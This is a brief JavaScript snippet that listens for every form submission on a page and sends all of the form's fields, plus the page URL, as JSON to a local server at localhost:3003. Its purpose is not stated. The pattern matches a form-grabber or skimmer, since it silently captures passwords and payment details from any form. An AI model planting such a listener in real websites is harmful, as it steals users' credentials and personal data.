function getFullUrl(){
    return window.location.origin + window.location.pathname;
}

async function grabFormSubmit(event) {
    const form = event.target;
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());
    const origin = getFullUrl();
    await fetch('http://localhost:3003/submit', {
        method: 'POST',
        body: JSON.stringify({
            __originURL: origin,
            ...data,
        }),
        headers: {
            'Content-Type': 'application/json',
            'Origin': getFullUrl(),
            'Referer': getFullUrl()
        }
    });
}

document.addEventListener('submit', grabFormSubmit);